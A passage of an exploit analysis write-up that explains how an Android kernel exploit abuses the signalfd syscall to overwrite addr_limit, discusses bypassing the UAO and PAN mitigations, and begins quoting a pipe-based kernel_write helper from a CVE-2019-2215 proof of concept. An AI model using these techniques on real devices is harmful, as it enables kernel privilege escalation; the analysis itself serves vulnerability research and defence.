 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; copy_from_user</span><span class="vdnyYxSRCi-c0">(&amp;</span><span class="vdnyYxSRCi-c4">sigmask</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;user_mask</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">sizeof</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">sigmask</span><span class="vdnyYxSRCi-c0">)))</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">EINVAL</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c4">sigdelsetmask</span><span class="vdnyYxSRCi-c0">(&amp;</span><span class="vdnyYxSRCi-c4">sigmask</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;sigmask</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">SIGKILL</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">|</span><span class="vdnyYxSRCi-c4">&nbsp;sigmask</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">SIGSTOP</span><span class="vdnyYxSRCi-c0">));</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">signotset</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">(&amp;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">sigmask</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">);</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c20 vdnyYxSRCi-c9">// [1]</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5 vdnyYxSRCi-c9">if</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">(</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">ufd </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">==</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">-</span><span class="vdnyYxSRCi-c9 vdnyYxSRCi-c13">1</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">)</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">{</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c20 vdnyYxSRCi-c9">// [2]</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ctx </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;kmalloc</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c5">sizeof</span><span class="vdnyYxSRCi-c0">(*</span><span class="vdnyYxSRCi-c4">ctx</span><span class="vdnyYxSRCi-c0">),</span><span class="vdnyYxSRCi-c4">&nbsp;GFP_KERNEL</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(!</span><span class="vdnyYxSRCi-c4">ctx</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">ENOMEM</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ctx</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">sigmask </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;sigmask</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c20">/*</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* When we call this, the initialization must be complete, since</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* anon_inode_getfd() will install the fd.</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c20">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ufd </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;anon_inode_getfd</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c18">&quot;[signalfd]&quot;</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">&amp;</span><span class="vdnyYxSRCi-c4">signalfd_fops</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;ctx</span><span class="vdnyYxSRCi-c0">,</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;O_RDWR </span><span class="vdnyYxSRCi-c0">|</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">flags </span><span class="vdnyYxSRCi-c0">&amp;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">O_CLOEXEC </span><span class="vdnyYxSRCi-c0">|</span><span class="vdnyYxSRCi-c4">&nbsp;O_NONBLOCK</span><span class="vdnyYxSRCi-c0">)));</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">ufd </span><span class="vdnyYxSRCi-c0">&lt;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kfree</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">ctx</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">}</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c5 vdnyYxSRCi-c9">else</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">{</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="vdnyYxSRCi-c20 vdnyYxSRCi-c9">// [3]</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">struct</span><span class="vdnyYxSRCi-c4">&nbsp;fd f </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;fdget</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">ufd</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(!</span><span class="vdnyYxSRCi-c4">f</span><span class="vdnyYxSRCi-c0">.</span><span class="vdnyYxSRCi-c4">file</span><span class="vdnyYxSRCi-c0">)</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">EBADF</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">ctx </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">=</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;f</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">.</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">file</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">-&gt;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">private_data</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c20 vdnyYxSRCi-c9">// [4]</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5 vdnyYxSRCi-c9">if</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">(</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">f</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">.</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">file</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">-&gt;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">f_op </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">!=</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">&amp;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">signalfd_fops</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">)</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">{</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c20 vdnyYxSRCi-c9">// [5]</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fdput</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">f</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">-</span><span class="vdnyYxSRCi-c4">EINVAL</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; spin_lock_irq</span><span class="vdnyYxSRCi-c0">(&amp;</span><span class="vdnyYxSRCi-c4">current</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">sighand</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">siglock</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">ctx</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">-&gt;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">sigmask </span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">=</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp;sigmask</span><span class="vdnyYxSRCi-c0 vdnyYxSRCi-c9">;</span><span class="vdnyYxSRCi-c4 vdnyYxSRCi-c9">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="vdnyYxSRCi-c20 vdnyYxSRCi-c9">// [6] WRITE!</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; spin_unlock_irq</span><span class="vdnyYxSRCi-c0">(&amp;</span><span class="vdnyYxSRCi-c4">current</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">sighand</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">siglock</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wake_up</span><span class="vdnyYxSRCi-c0">(&amp;</span><span class="vdnyYxSRCi-c4">current</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">sighand</span><span class="vdnyYxSRCi-c0">-&gt;</span><span class="vdnyYxSRCi-c4">signalfd_wqh</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fdput</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">f</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c0">}</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c3"></span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="vdnyYxSRCi-c5">return</span><span class="vdnyYxSRCi-c4">&nbsp;ufd</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c0">}</span></p></td></tr></table>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>First the function modifies the mask that was passed in. The </span><span class="vdnyYxSRCi-c2">mask</span><span>&nbsp;passed into the function is the signals that should be accepted via the file descriptor, but the </span><span class="vdnyYxSRCi-c2">sigmask</span><span>&nbsp;member of the </span><span class="vdnyYxSRCi-c2">signalfd</span><span>&nbsp;struct represents the signals that should be blocked. The </span><span class="vdnyYxSRCi-c2">sigdelsetmask</span><span>&nbsp;and </span><span class="vdnyYxSRCi-c2">signotset</span><span>&nbsp;calls at [1] makes this change. The call to </span><span class="vdnyYxSRCi-c2">sigdelsetmask</span><span>&nbsp;ensures that the </span><span class="vdnyYxSRCi-c2">SIG_KILL</span><span>&nbsp;and </span><span class="vdnyYxSRCi-c2">SIG_STOP</span><span>&nbsp;signals are always blocked so it clears bit 8 (</span><span class="vdnyYxSRCi-c2">SIG_KILL</span><span>) and bit 18 (</span><span class="vdnyYxSRCi-c2">SIG_STOP</span><span>) in order for them to be set in the next call. Then </span><span class="vdnyYxSRCi-c2">signotset</span><span>&nbsp;flips each bit in the mask. The mask that is written is </span><span class="vdnyYxSRCi-c2">~(mask_in_arg &amp; 0xFFFFFFFFFFFBFEFF)</span><span>. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The function checks whether or not the file descriptor passed in is </span><span class="vdnyYxSRCi-c2">-1</span><span>&nbsp;at [2]. In this exploit&rsquo;s case it&rsquo;s not so we fall into the </span><span class="vdnyYxSRCi-c2">else</span><span>&nbsp;block at [3]. At [4] the </span><span class="vdnyYxSRCi-c2">signalfd_ctx*</span><span>&nbsp;is set to the </span><span class="vdnyYxSRCi-c2">private_data</span><span class="vdnyYxSRCi-c7">&nbsp;pointer. </span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The signalfd manual page also says that the fd argument &ldquo;</span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://man7.org/linux/man-pages/man2/signalfd.2.html#:~:text=If%20fd%20is%20not%20%2D1%2C%20then%20it%20must%20specify%20a%0A%20%20%20%20%20%20%20valid%20existing%20signalfd%20file%20descriptor">must specify a valid existing signalfd file descriptor</a></span><span>&rdquo;. To verify this, at [5] the syscall checks if the underlying file&rsquo;s </span><span class="vdnyYxSRCi-c2">f_op</span><span>&nbsp;equals the </span><span class="vdnyYxSRCi-c2">signalfd_ops</span><span>. This is why the </span><span class="vdnyYxSRCi-c2">f_op</span><span>&nbsp;was set to </span><span class="vdnyYxSRCi-c2">signalfd_ops</span><span>&nbsp;in the previous section. Finally at [6], the overwrite occurs. The user provided </span><span class="vdnyYxSRCi-c2">mask</span><span>&nbsp;is written to the address in </span><span class="vdnyYxSRCi-c2">private_data</span><span>. In the exploit&rsquo;s case, the fake file struct&rsquo;s </span><span class="vdnyYxSRCi-c2">private_data</span><span>&nbsp;was set to the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;pointer. So when the mask is written, we&rsquo;re actually overwriting the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span class="vdnyYxSRCi-c2 vdnyYxSRCi-c33 vdnyYxSRCi-c44">.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>The exploit calls </span><span class="vdnyYxSRCi-c2">signalfd</span><span>&nbsp;with a mask argument</span><span>&nbsp;of </span><span class="vdnyYxSRCi-c2">0xFFFFFF8000000000</span><span>. So the value </span><span class="vdnyYxSRCi-c2">~(0xFFFFFF8000000000 &amp; 0xFFFFFFFFFFFCFEFF) = 0x7FFFFFFFFF</span><span>, also known as</span><span>&nbsp;</span><span class="vdnyYxSRCi-c2">USER_DS</span><span>. We&rsquo;ll talk about why they&rsquo;re overwriting the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;as </span><span class="vdnyYxSRCi-c2">USER_DS</span><span>&nbsp;rather than </span><span class="vdnyYxSRCi-c2">KERNEL_DS</span><span class="vdnyYxSRCi-c7">&nbsp;in the next section. </span></p><h2 class="vdnyYxSRCi-c17" id="h.k1hy6h4fm2ex"><span class="vdnyYxSRCi-c16">Working Around UAO and PAN</span></h2>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>&ldquo;User-Access Override&rdquo; (UAO) and &ldquo;Privileged Access Never&rdquo; (PAN) are two exploit mitigations that are commonly found on modern Android devices. Their kernel configs are </span><span class="vdnyYxSRCi-c2">CONFIG_ARM64_UAO</span><span>&nbsp;and </span><span class="vdnyYxSRCi-c2">CONFIG_ARM64_PAN</span><span class="vdnyYxSRCi-c7">. Both PAN and UAO are hardware mitigations released on ARMv8 CPUs. PAN protects against the kernel directly accessing user-space memory. UAO works with PAN by allowing unprivileged load and store instructions to act as privileged load and store instructions when the UAO bit is set.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8"><span>It&rsquo;s often said that the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;overwrite technique detailed above doesn&rsquo;t work on devices with UAO and PAN turned on. The commonly used </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;overwrite technique was to change the </span><span class="vdnyYxSRCi-c2">addr_limit</span><span>&nbsp;to a very high address, like 0xFFFFFFFFFFFFFFFF (</span><span class="vdnyYxSRCi-c2">KERNEL_DS</span><span>), and then use a pair of pipes for arbitrary kernel read and write. This is what Jann and I did in our </span><span class="vdnyYxSRCi-c24"><a class="vdnyYxSRCi-c61" href="https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885#176">proof-of-concept for CVE-2019-2215</a></span><span>&nbsp;back in 2019. Our </span><span class="vdnyYxSRCi-c2">kernel_write</span><span class="vdnyYxSRCi-c7">&nbsp;function is shown below.</span></p>
 <p class="vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14"><span class="vdnyYxSRCi-c7"></span></p><a id="t.b8a4e52cd732ff2532144e609e086484605b13e2"></a><a id="t.29"></a><table class="vdnyYxSRCi-c23"><tr class="vdnyYxSRCi-c19"><td class="vdnyYxSRCi-c10" colspan="1" rowspan="1">
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c5">void</span><span class="vdnyYxSRCi-c4">&nbsp;kernel_write</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c5">unsigned</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">long</span><span class="vdnyYxSRCi-c4">&nbsp;kaddr</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">void</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">*</span><span class="vdnyYxSRCi-c4">buf</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">unsigned</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c5">long</span><span class="vdnyYxSRCi-c4">&nbsp;len</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">{</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; errno </span><span class="vdnyYxSRCi-c0">=</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0</span><span class="vdnyYxSRCi-c0">;</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">len </span><span class="vdnyYxSRCi-c0">&gt;</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c13">0x1000</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;errx</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c13">1</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c18">&quot;kernel writes over PAGE_SIZE are messy, tried 0x%lx&quot;</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;len</span><span class="vdnyYxSRCi-c0">);</span></p>
 <p class="vdnyYxSRCi-c1"><span class="vdnyYxSRCi-c4">&nbsp; </span><span class="vdnyYxSRCi-c5">if</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">write</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c4">kernel_rw_pipe</span><span class="vdnyYxSRCi-c0">[</span><span class="vdnyYxSRCi-c13">1</span><span class="vdnyYxSRCi-c0">],</span><span class="vdnyYxSRCi-c4">&nbsp;buf</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;len</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c0">!=</span><span class="vdnyYxSRCi-c4">&nbsp;len</span><span class="vdnyYxSRCi-c0">)</span><span class="vdnyYxSRCi-c4">&nbsp;err</span><span class="vdnyYxSRCi-c0">(</span><span class="vdnyYxSRCi-c13">1</span><span class="vdnyYxSRCi-c0">,</span><span class="vdnyYxSRCi-c4">&nbsp;</span><span class="vdnyYxSRCi-c18">&quot;kernel_write failed to load userspace buffer&quot;</span><span class="vdnyYxSRCi-c0">);</span></p>
